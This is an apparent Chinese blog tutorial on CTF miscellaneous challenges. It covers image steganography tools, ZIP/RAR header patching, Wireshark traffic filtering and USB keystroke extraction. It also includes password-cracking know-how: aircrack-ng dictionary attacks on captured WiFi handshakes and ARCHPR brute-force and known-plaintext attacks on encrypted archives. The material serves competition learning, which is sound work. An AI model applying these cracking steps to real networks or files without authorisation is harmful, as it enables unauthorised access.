<p>另外通过安装插件HEX-Editor可以实现010Editor</p>
<h4 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h4><h5 id="图片隐写的一些常见隐写方法"><a href="#图片隐写的一些常见隐写方法" class="headerlink" title="图片隐写的一些常见隐写方法"></a>图片隐写的一些常见隐写方法</h5><ol>
<li>细微的颜色差别</li>
<li>GIF图多帧隐藏<ol>
<li>颜色通道隐藏</li>
<li>不同帧图信息隐藏</li>
<li>不同帧对比隐写</li>
</ol>
</li>
<li>EXIF信息隐藏</li>
<li>图片修复<ol>
<li>图片头修复</li>
<li>图片尾修复</li>
<li>CRC校验修复</li>
<li>长、宽、高度修复</li>
</ol>
</li>
<li>最低有效位LSB隐写</li>
<li>图片加密<ol>
<li>Stegdetect</li>
<li>outguess</li>
<li>Jphide</li>
<li>F5</li>
</ol>
</li>
</ol>
<h5 id="图片文件隐写"><a href="#图片文件隐写" class="headerlink" title="图片文件隐写"></a>图片文件隐写</h5><h5 id="1、firework"><a href="#1、firework" class="headerlink" title="1、firework"></a>1、firework</h5><p>使用winhex打开文件时会看到文件头部中包含firework的标识，通过 firework / <strong>ps</strong> 可以找到<strong>隐藏图片</strong>。</p>
<p>使用场景：查看隐写的图片文件</p>
<p>最底下是每一帧的图片</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531213025025.png" alt="image-20200531213025025"></p>
<h5 id="2、Exif"><a href="#2、Exif" class="headerlink" title="2、Exif"></a>2、Exif</h5><p>​    Exif按照JPEG的规格在JPEG中插入一些图像 / 数字相机的信息数据以及缩略图像，可以通过与JPEG兼容的互联网浏览器 / 图片浏览器 / 图像处理等一些软件来查看Exif格式的图像文件，就跟浏览器通常的JPEG图像文件一样。</p>
<p>图片右键属性，查看详细信息，在相关选项卡中查找flag信息</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601220121589.png" alt="image-20200601220121589"></p>
<h5 id="3、Stegsolve"><a href="#3、Stegsolve" class="headerlink" title="3、Stegsolve"></a>3、Stegsolve</h5><p>​    当两张jpg图片外观、大小、像素都基本相同时，可以考虑进行结合分析，即将两个文件的像素RGB值进行XOR、ADD、SUB等操作，看能否得到有用的信息，StegSolve可以方便的进行这些操作。</p>
<p>1、打开一张图片，点击analyse中的image combiner</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601085301270.png" alt="image-20200601085301270"></p>
<p>筛选有用的图片进行save保存，这里显示的二维码是错误的，黑白颜色相反，所以需要进行取反处理，直接在画图中选中二维码右键取反就可以</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601085458522.png" alt="image-20200601085458522"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601205608572.png" alt="image-20200601205608572"></p>
<p>如果是二维码GIF的话会看到一直动，就可以使用Stegsolve工具将二维码没帧都给截取下来</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531215008490.png" alt="image-20200531215008490"></p>
<h4 id="图片文件隐写-LSB"><a href="#图片文件隐写-LSB" class="headerlink" title="图片文件隐写-LSB"></a>图片文件隐写-LSB</h4><h5 id="4、LSB-最低有效位-Least-Significant-Bit"><a href="#4、LSB-最低有效位-Least-Significant-Bit" class="headerlink" title="4、LSB(最低有效位 Least Significant Bit)"></a>4、LSB(最低有效位 Least Significant Bit)</h5><p>​    LSB替换隐写基本思想是用嵌入的秘密信息取代载体图像的最低比特位，原来的7个高位平面与替代秘密信息的最低位平面组合成隐藏信息的新图形。</p>
<ol>
<li>像素三原色（RGB）</li>
<li>通过修改像素中最低位的1bit来达到隐藏的效果</li>
<li>工具：stegsolve、zsteg、wbstego4、python脚本</li>
</ol>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601092142617.png" alt="image-20200601092142617"></p>
<h5 id="1、Stegsolve-jar工具"><a href="#1、Stegsolve-jar工具" class="headerlink" title="1、Stegsolve.jar工具"></a>1、Stegsolve.jar工具</h5><p>使用的时候这个是需要有顺序的，有可能是RGB有可能是GBR等等</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601092344186.png" alt="image-20200601092344186"></p>
<h5 id="2、zsteg工具"><a href="#2、zsteg工具" class="headerlink" title="2、zsteg工具"></a>2、zsteg工具</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601100325469.png" alt="image-20200601100325469"></p>
<h5 id="3、wbstego4"><a href="#3、wbstego4" class="headerlink" title="3、wbstego4"></a>3、wbstego4</h5><p>解密通过lsb加密的图片</p>
<p>这个不止针对图片的最低有效位，还可能针对PDF的或者其他一些文件格式的最低有效位。它针对图片的最低有效位一般是针对 <code>.bmp</code> 的图片</p>
<p>这是wbstego4支持的4中文件格式</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601104521983.png" alt="image-20200601104521983"></p>
<p>因为是bmp文件所以将jpg的文件可以使用画图等工具另存为bmp格式的文件，使用wbStego4进行选择打开。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601135421953.png" alt="image-20200601135421953"></p>
<p>文件解密后存放的另外一个位置，一直下一步就OK</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601135624879.png" alt="image-20200601135624879"></p>
<p>可以看到保存到了这样一 个文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601135720851.png" alt="image-20200601135720851"></p>
<p>打开后是乱码，然后会发现其中有flag，这只是这个工具的使用方法，当然也可以不用这个工具，直接使用zsteg就可以</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601135905546.png" alt="image-20200601135905546"></p>
<h5 id="4、python脚本"><a href="#4、python脚本" class="headerlink" title="4、python脚本"></a>4、python脚本</h5><p>将脚本放在kali中运行，将目标文件放在脚本同目录下，将脚本中的文件名修改为文件名，运行脚本即可。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601140821948.png" alt="image-20200601140821948"></p>
<p>如果不用脚本的话，需要将这个图片转为PNG格式使用Stegsolve查看图片的通道</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601141541276.png" alt="image-20200601141541276"></p>
<h5 id="5、TweakPNG"><a href="#5、TweakPNG" class="headerlink" title="5、TweakPNG"></a>5、TweakPNG</h5><p>​    TweakPNG是一款简单易用的PNG图像浏览工具，它允许查看和修改一些PNG图像文件的元信息存储。</p>
<p>使用场景：文件头正常却无法打开文件，利用TweakPNG修改CRC</p>
<p>例：</p>
<p>1、当PNG文件头正常但无法打开文件，可能是CRC校验出错，可以尝试通过TweakPNG打开PNG，会弹出校验错误的提示，这里显示CRC是fe1a5ab6，正确的是b0a7a9f1。打开010Editor搜索fe1a5ab6将其改为b0a7a9f1</p>
<p>例：</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601144401788.png" alt="image-20200601144401788"></p>
<p>2、文件头正常却无法打开，利用TweakPNG修改CRC….</p>
<p>又是CRC没有错误，但是图片的高度或者宽度发生了错误，需要通过CRC计算出正确的高度或者宽度</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601144643501.png" alt="image-20200601144643501"></p>
<p>例：</p>
<p>使用tweakpng打开图片，查看crc</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601191302824.png" alt="image-20200601191302824"></p>
<p>使用010Editor打开查看16进制，然后看看CRC是否相等，如果不同，进行修改，可以看到CRC是不同的，然后进行修改</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601191522264.png" alt="image-20200601191522264"></p>
<p>可以直接替换将全部的cbd6df8a进行替换</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601191728411.png" alt="image-20200601191728411"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601191803366.png" alt="image-20200601191803366"></p>
<p>查看图片，发现并没有生效，所以判断不是CRC造成的，然后将crc改回原来的值。因为不是crc造成的，所以这样就要计算它的高度和宽度了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601191830369.png" alt="image-20200601191830369"></p>
<p>可以看到python计算出的宽度和高度和图片本身是不同的，所以将A4改为F4</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601193158635.png" alt="image-20200601193158635"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601193245304.png" alt="image-20200601193245304"></p>
<p>保存，再次进行查看图片。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601193325132.png" alt="image-20200601193325132"></p>
<h5 id="6、Bftools"><a href="#6、Bftools" class="headerlink" title="6、Bftools"></a>6、Bftools</h5><p>​    Bftools用于解密图片信息。</p>
<p>使用场景：在Windows的cmd下，对加密过的图片文件进行解密。</p>
<p>格式：</p>
<p>Btfools.exe decode braincopter 要解密的图片名称 -output 输出文件名</p>
<p>Bftools.exe run 上一步输出的文件。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601194534064.png" alt="image-20200601194534064"></p>
<p>ls 或者 dir 查看一下</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601194602784.png" alt="image-20200601194602784"></p>
<p>在使用bftools.exe run 123.png</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601194700834.png" alt="image-20200601194700834"></p>
<h5 id="7、SilentEye"><a href="#7、SilentEye" class="headerlink" title="7、SilentEye"></a>7、SilentEye</h5><p>​    silenteye是一款可以将文字或者文件隐藏到图片的解密工具</p>
<p>使用场景：windows下打开silentEye工具，对加密的图片进行解密</p>
<p>例：</p>
<p>1、使用silentEye程序打开目标图片，点击image —&gt; decode，点击decode，可以查看隐藏文件，点击保存即可</p>
<p>原始界面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601195333388.png" alt="image-20200601195333388"></p>
<p>打开文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601195451150.png" alt="image-20200601195451150"></p>
<p>点击decode进行解密，再次点击decode会出现flag.txt，这是选择保存文件的目录，按照自己进行选择路径</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601195608474.png" alt="image-20200601195608474"></p>
<p>查看保存路径，成功生成flag文件，打开里面你也有flag值</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601195807699.png" alt="image-20200601195807699"></p>
<h5 id="8-JPG图像加密"><a href="#8-JPG图像加密" class="headerlink" title="8.JPG图像加密"></a>8.JPG图像加密</h5><p>1）Stegdetect 工具探测加密方式</p>
<p>​    stegdetect程序主要分析JPEG文件。因此用stegdetect可以检测到通过JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage等这些隐写工具隐藏的信息。</p>
<p>stegdetect xxx.jpg</p>
<p>stegdetect -s 敏感度 xxx.jpgexi</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601202600053.png" alt="image-20200601202600053"></p>
<p>2）Jphide</p>
<p>​    Jphide是基于最低有效位LSB的JPEG格式图像隐写算法。</p>
<p>例：</p>
<p>​    Stegdetect提示jphide加密时，可以用Jphs工具进行解密，打开jphswin.exe，使用open jpeg打开图片，点击seek，输入密码和确认密码，在弹出文件框中选择要保存的解密文件位置即可，结果保存成txt文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601202612647.png" alt="image-20200601202612647"></p>
<p>3）Outguess</p>
<p>​    outguess一般用于解密文件信息</p>
<p>使用场景：stegdetect识别出来或者题目提示是outguess加密的图片</p>
<p>该工具需要编译使用：./configure &amp;&amp; make &amp;&amp; make install</p>
<p>格式：outguess -r 要解密的文件名   输出结果文件名</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601202821052.png" alt="image-20200601202821052"></p>
<p>4）F5</p>
<p>​    F5一般一用解密文件信息</p>
<p>使用场景：stegdetect识别出来或者题目提示是F5加密的图片</p>
<p>进入F5-steganography_F5目录，将图片文件拷贝至该目录下，从CMD进入该目录</p>
<p>格式：java Exrtact 要解密的文件名 -p 密码</p>
<p>运行结束后，我们可以直接在目录下的output.txt中看到结果</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601203803422.png" alt="image-20200601203803422"></p>
<h5 id="9、二维码处理"><a href="#9、二维码处理" class="headerlink" title="9、二维码处理"></a>9、二维码处理</h5><p>1、使用二维码扫描工具CQR.exe打开图片，找到内容没买过字段</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601204834103.png" alt="image-20200601204834103"></p>
<p>2、如果二维码某个定位角被覆盖了，该工具有时候也可以自动识别，如果识别失败，需要使用PS或者画图工具将另外几个叫的定位符移动到相应的位置，补全二维码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601204839721.png" alt="image-20200601204839721"></p>
<p>3、如果某个二维码的定位点中间是白色的，可能被反色了，使用画图工具吧颜色反色回来在扫描即可。</p>
<h4 id="压缩文件分析"><a href="#压缩文件分析" class="headerlink" title="压缩文件分析"></a>压缩文件分析</h4><h5 id="1、伪加密"><a href="#1、伪加密" class="headerlink" title="1、伪加密"></a>1、伪加密</h5><p>​    如果压缩文件时加密的，或文件头正常但解压缩错误，首先尝试文件是否为伪加密。zip文件是否加密是通过标识符来显示的，在每个文件的文件目录字段有以为专门表示了文件是否加密，将其设置为00表示改文件未加密，如果成功解压则表示文件为伪加密，如果解压出错说明文件为真加密。</p>
<p>使用场景：伪加密文件</p>
<p>操作方法：使用010Editor打开压缩文件，找到文件头第九第十个字符，将其修改为0000</p>
<p>1、使用010Editor打开文件搜索16进制504B0102，可以看到每个加密文件的文件头字段。</p>
<p>为什么是504B0102？    因为504B0102是文件头</p>
<p>从50开始数，第九第十个字符为加密字段将其改为0000.</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200603141436078.png" alt="20200603141436078.png">志位后如报错消失且正常解压，说明是伪加密。使用010Editor打开RAR文件，找到第24个字节，该字节尾数为4表示加密，0表示无加密，将尾数改为0即可破解伪加密。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200603143127926.png" alt="image-20200603143127926"></p>
<h5 id="2、暴力破解"><a href="#2、暴力破解" class="headerlink" title="2、暴力破解"></a>2、暴力破解</h5><p>​    通常我们可以使用ARCHPR.exe工具来破解zip文件</p>
<p>使用场景：windows下加密过的zip文件</p>
<p>现在ARCHPR不支持高版本解密。选择 压缩包时会出现错误</p>
<p>​    1、攻击类型选择暴力破解，在范围位置根据提示选择暴力破解范围选项设置暴力破解包含的类型、开始于和结束于选项具体范围，如果没有定于则全范围暴力破解。点击打开选择要破解的文件，点击开始进行破解。建议使用1~9位的数字密码，以及系统自带的英文字典作为密码字典。</p>
<p>2、攻击类型选择掩码可以进行复杂的暴力破解，比如知道密码前三位是abc，后三位为数字，则在攻击类型选择掩码，再掩码处输入abc???，暴力范围选项选择所有数字，打开要破解的点击，点击破解。时???的部分会被我们选择的暴力破解范围中的字符代替。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200603150609122.png" alt="image-20200603150609122"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200603151244361.png" alt="image-20200603151244361"></p>
<h5 id="3、明文攻击"><a href="#3、明文攻击" class="headerlink" title="3、明文攻击"></a>3、明文攻击</h5><p>​    明文攻击指知道加密的ZIP中部分文件的明文内容，利用这些内容推测出秘钥并解密ZIP文件的攻击方法，相比于暴力破解，这种方法在破解密码较为复杂的压缩包时效率更高。</p>
<p>使用场景：<strong>已知加密的zip部分文件明文内容</strong></p>
<p>例：假设一个加密的压缩包中有两个文件readme.txt和flag.ext，其中flag.txt的内容使我们希望知道的内容，而我们拥有readme.txt的明文文件，使用上述两个文件即可进行明文攻击</p>
<p>操作：</p>
<p>1、将readme.txt的明文文件进行压缩，变成readme1.zip(即将明文文件不加密压缩后的文件)，加密的文件</p>
<p>选择要破解的文件，点击开始，破解成功后会获得密码。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200603153301226.png" alt="image-20200603153301226"></p>
<p>有时不一定能破解出文件口令，但是能够找到加密秘钥等信息，可以直接将文件解密，点击确定保存解密后的文件即可。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200603153936066.png" alt="image-20200603153936066"></p>
<p>使用该方法需要注意两个关键点：</p>
<p>1、有一个明文文件，压缩后CRC值与加密压缩包中的文件一致。</p>
<p>2、明文文件的压缩算法需要与加密压缩文件的压缩算法一致。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200603154354537.png" alt="image-20200603154354537"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200603155107348.png" alt="image-20200603155107348"></p>
<h5 id="RAR文件格式"><a href="#RAR文件格式" class="headerlink" title="RAR文件格式"></a>RAR文件格式</h5><p>有时候给出的RAR文件的头部各个字块会故意给错导致无法识别。</p>
<p>正常情况下是没有0x7A这个文件头的，所以这是错误的，那么我们就要修改0x7A将其改为74，0x74是文件头类型。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200603155649565.png" alt="image-20200603155649565"></p>
<p>更改后显示了两个文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200603155926679.png" alt="image-20200603155926679"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200603155757624.png" alt="image-20200603155757624"></p>
<h4 id="流量取证"><a href="#流量取证" class="headerlink" title="流量取证"></a>流量取证</h4><h5 id="流量包文件分析"><a href="#流量包文件分析" class="headerlink" title="流量包文件分析"></a>流量包文件分析</h5><p>CTF比赛中，流量包的取证分析时另一项重要的考察方向。</p>
<h6 id="通常比赛中会提供一个包含流量数据的PCAP文件，有时也会需要选手们先进行修复或重构传输文件后，在进行分析。"><a href="#通常比赛中会提供一个包含流量数据的PCAP文件，有时也会需要选手们先进行修复或重构传输文件后，在进行分析。" class="headerlink" title="通常比赛中会提供一个包含流量数据的PCAP文件，有时也会需要选手们先进行修复或重构传输文件后，在进行分析。"></a><em>通常比赛中会提供一个包含流量数据的PCAP文件，有时也会需要选手们先进行修复或重构传输文件后，在进行分析。</em></h6><ul>
<li>总体把握<ul>
<li>协议分级</li>
<li>端点统计</li>
</ul>
</li>
<li>过滤筛选<ul>
<li>过滤语法</li>
<li>Host，Protocol，contains，特征值</li>
</ul>
</li>
<li>发现异常<ul>
<li>特殊字符串</li>
<li>协议某字段</li>
<li>flag位于服务器中</li>
</ul>
</li>
<li>数据提取<ul>
<li>字符串取</li>
<li>文件提取</li>
</ul>
</li>
</ul>
<p>总体来说比赛中的流量分析可以概括一下三个方向</p>
<ul>
<li>流量包修复</li>
<li>协议分析</li>
<li>数据提取 、</li>
</ul>
<h5 id="Wireshark工具"><a href="#Wireshark工具" class="headerlink" title="Wireshark工具"></a>Wireshark工具</h5><p>使用Wireshark网络分析器进行流量分析</p>
<p>Wireshark的过滤器和过滤规则能够帮助我们迅速定位到要分析的报文。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200603172317772.png" alt="image-20200603172317772"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200603173254349.png" alt="image-20200603173254349"></p>
<h5 id="Wireshark过滤器"><a href="#Wireshark过滤器" class="headerlink" title="Wireshark过滤器"></a>Wireshark过滤器</h5><p>五元组</p>
<ul>
<li>源IP地址</li>
<li>源端口</li>
<li>目的IP地址</li>
<li>目的端口</li>
<li>传输层协议 </li>
</ul>
<p>利用Wireshark本身强大的报文过滤器，帮助我们筛选出想要的报文。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200603173850984.png" alt="image-20200603173850984"></p>
<p>常用的过滤命令：</p>
<h5 id="1、过滤IP，如源IP或者目标x-x-x-x"><a href="#1、过滤IP，如源IP或者目标x-x-x-x" class="headerlink" title="1、过滤IP，如源IP或者目标x.x.x.x"></a>1、过滤IP，如源IP或者目标x.x.x.x</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ip.src eq x.x.x.x or ip.dst eq x.x.x.x 或者 ip.addr eq x.x.x.x</span><br></pre></td></tr></table></figure>

<h5 id="2、过滤端口"><a href="#2、过滤端口" class="headerlink" title="2、过滤端口"></a>2、过滤端口</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcp.port eq 80 or udp.port eq 80</span><br><span class="line"></span><br><span class="line">tcp.dstport &#x3D;&#x3D; 80 只显示tcp协议的目标端口为80</span><br><span class="line"></span><br><span class="line">tcp.srcport &#x3D;&#x3D; 80 只显示tcp协议的源端口为80</span><br><span class="line"></span><br><span class="line">tcp.port &gt;&#x3D; 1 and tcp port &lt;&#x3D; 80</span><br></pre></td></tr></table></figure>

<h5 id="3、过滤协议"><a href="#3、过滤协议" class="headerlink" title="3、过滤协议"></a>3、过滤协议</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcp&#x2F;udp&#x2F;arp&#x2F;icmp&#x2F;http&#x2F;ftp&#x2F;dns&#x2F;ip......</span><br></pre></td></tr></table></figure>

<h5 id="4、过滤MAC"><a href="#4、过滤MAC" class="headerlink" title="4、过滤MAC"></a>4、过滤MAC</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eth.dst &#x3D;&#x3D; A0:00:00:04:C5:84过滤目标mac</span><br></pre></td></tr></table></figure>

<h5 id="5、包长度过滤"><a href="#5、包长度过滤" class="headerlink" title="5、包长度过滤"></a>5、包长度过滤</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">upd.length &#x3D;&#x3D; 26 	这个长度是指udp本身固定长度8加上udp下面那块数据包之和。</span><br><span class="line"></span><br><span class="line">tcp.len &gt;&#x3D; 7 		指的是ip数据包（tcp下面那块数据），不包括tcp本身</span><br><span class="line"></span><br><span class="line">ip.len &#x3D;&#x3D; 94		除了以太网头固定长度14，其他都算是ip.len，即从ip本身到最后</span><br><span class="line"></span><br><span class="line">frame.len &#x3D;&#x3D; 119 	整个数据包长度，从eth开始到最后</span><br></pre></td></tr></table></figure>

<h5 id="6、Http模式过滤"><a href="#6、Http模式过滤" class="headerlink" title="6、Http模式过滤"></a>6、Http模式过滤</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http.request.method &#x3D;&#x3D; &quot;GET&quot;</span><br><span class="line"></span><br><span class="line">http.request.method &#x3D;&#x3D; &quot;POST&quot;</span><br><span class="line"></span><br><span class="line">http.request.uri &#x3D;&#x3D; &quot;&#x2F;img&#x2F;logo-edu.gif&quot;</span><br><span class="line"></span><br><span class="line">http contains &quot;GET&quot;</span><br><span class="line"></span><br><span class="line">http contains &quot;HTTP&#x2F;1.&quot;</span><br><span class="line"></span><br><span class="line">http.request.method &#x3D;&#x3D; &quot;GET&quot; &amp;&amp; http contains &quot;User-Agent:&quot;</span><br><span class="line"></span><br><span class="line">http contains &quot;flag&quot;</span><br><span class="line"></span><br><span class="line">http contains &quot;key&quot;</span><br><span class="line"></span><br><span class="line">tcp contains &quot;flag&quot;</span><br></pre></td></tr></table></figure>

<h5 id="WireShark协议分析"><a href="#WireShark协议分析" class="headerlink" title="WireShark协议分析"></a>WireShark协议分析</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200603191446662.png" alt="image-20200603191446662"></p>
<p>根据数据包特征进行筛选</p>
<p>比如查看数据包的时候，有的数据包有某种特征，比如有http(80)，就可以筛选出这种特征出来。</p>
<p>右键 —&gt; 作为过滤器应用 —&gt; 选中</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200604075738364.png" alt="image-20200604075738364"></p>
<h5 id="WireShark-流汇聚"><a href="#WireShark-流汇聚" class="headerlink" title="WireShark 流汇聚"></a>WireShark 流汇聚</h5><p>​    在关注的http数据包或cp数据包中选择流汇聚，可以将<strong>HTTP流</strong>或<strong>TCP流</strong>汇聚或还原成数据，在弹出的框中可以看到数据内容。</p>
<p>flag值就有可能存在TCP / HTTP流中</p>
<h5 id="常见的HTTP流关键内容："><a href="#常见的HTTP流关键内容：" class="headerlink" title="常见的HTTP流关键内容："></a><em>常见的HTTP流关键内容：</em></h5><h6 id="1、HTML中直接包含重要信息。"><a href="#1、HTML中直接包含重要信息。" class="headerlink" title="1、HTML中直接包含重要信息。"></a>1、HTML中直接包含重要信息。</h6><h6 id="2、上传或下载文件内容，通常包含文件名，hash值相等关键信息，常用POST请求上传"><a href="#2、上传或下载文件内容，通常包含文件名，hash值相等关键信息，常用POST请求上传" class="headerlink" title="2、上传或下载文件内容，通常包含文件名，hash值相等关键信息，常用POST请求上传"></a>2、上传或下载文件内容，通常包含文件名，hash值相等关键信息，常用POST请求上传</h6><h6 id="3、一句话木马，POST请求，内容包含eval，内容使用base64加密"><a href="#3、一句话木马，POST请求，内容包含eval，内容使用base64加密" class="headerlink" title="3、一句话木马，POST请求，内容包含eval，内容使用base64加密"></a>3、一句话木马，POST请求，内容包含eval，内容使用base64加密</h6><p>HTTP流：</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200604080014248.png" alt="image-20200604080014248"></p>
<p>也可以保存成另一种格式</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200604081346525.png" alt="image-20200604081346525"></p>
<p>例如：</p>
<p>打开事先准备好的题，找到对应的流，然后进行数据流追踪，筛选值里面就有可能有flag值</p>
<p>如果当流很多的时候可以使用数据流筛选里面的命令进行删选。</p>
<p>这个题里面就有一个base64加密得值，进行解密即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200604094211391.png" alt="image-20200604094211391"></p>
<h5 id="WireShark-数据提取"><a href="#WireShark-数据提取" class="headerlink" title="WireShark 数据提取"></a>WireShark 数据提取</h5><p>1、使用wireshark可以自动提取通过http传输的文件内容。</p>
<p>文件 —&gt; 导出对象 —&gt; HTTP</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200604094511491.png" alt="image-20200604094511491"></p>
<p>可以看到一个eval，说明这是以一个一句话木马存储的文件，第一段是base64加密的文件</p>
<p>89504E47是png的图片的文件头，将下面的16进制全部复制到一个文本，使用010Editor打开</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200604105348978.png" alt="image-20200604105348978"></p>
<p>2、wireshark手动提取文件内容。</p>
<p>点击想要的数据包，选定media type的位置</p>
<p>右键 —&gt; 导出分组字节流 或者 点击菜单栏  文件 —&gt; 导出分组字节流，快捷键Ctrl+H在弹出的框中将文件保存成二进制文件。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200604110757287.png" alt="image-20200604110757287"></p>
<h5 id="无线wifi流量包"><a href="#无线wifi流量包" class="headerlink" title="无线wifi流量包"></a>无线wifi流量包</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200604152044165.png" alt="image-20200604152044165"></p>
<p>aircrack-ng工具进行wifi密码破解</p>
<p>1、用aircrack-ng检查cap包：arcrack-ng xxx.cap</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200605102927768.png" alt="image-20200605102927768"></p>
<p>2、用aircrack-ng跑字典进行握手包破解：aircrack-ng xxx.cap -w pass.txt</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200605111002987.png" alt="image-20200605111002987"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200605111056255.png" alt="image-20200605111056255"></p>
<h4 id="USB流量包文件分析"><a href="#USB流量包文件分析" class="headerlink" title="USB流量包文件分析"></a>USB流量包文件分析</h4><h5 id="USB流量"><a href="#USB流量" class="headerlink" title="USB流量"></a>USB流量</h5><h6 id="USB流量也是流量分析题的考察点，一般考察的流量涉及键盘击键，鼠标移动与点击，存储设备的明文传输通信，USB无线网卡网络传输内容等。"><a href="#USB流量也是流量分析题的考察点，一般考察的流量涉及键盘击键，鼠标移动与点击，存储设备的明文传输通信，USB无线网卡网络传输内容等。" class="headerlink" title="USB流量也是流量分析题的考察点，一般考察的流量涉及键盘击键，鼠标移动与点击，存储设备的明文传输通信，USB无线网卡网络传输内容等。"></a>USB流量也是流量分析题的考察点，一般考察的流量涉及键盘击键，鼠标移动与点击，存储设备的明文传输通信，USB无线网卡网络传输内容等。</h6><p>USB协议的数据部分在Leftover Capture Data域之中。</p>
<p>右键leftover capture data —&gt; 应用为例。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200605111406012.png" alt></p>
<h5 id="USB键盘流量抓取分析"><a href="#USB键盘流量抓取分析" class="headerlink" title="USB键盘流量抓取分析"></a>USB键盘流量抓取分析</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200606213030411.png" alt="image-20200606213030411"></p>
<p>Leftover Capture Data数据提取方式1：</p>
<p>文件 —&gt; 导出分组解析结构 —&gt; 为CSV，导出保存成一个.csv文件。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200606213318200.png" alt="image-20200606213318200"></p>
<p>Leftover Capture Data数据提取方式 2：</p>
<p>使用wireshark提供的命令工具 tshark，可以将Leftover Capture Data数据单独复制出来。</p>
<p><code>tshark -r 流量包名 -T flelds -e usb.capdata &gt; 要保存的文件</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200606215013376.png" alt="image-20200606215013376"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200606221053278.png" alt="image-20200606221053278"></p>
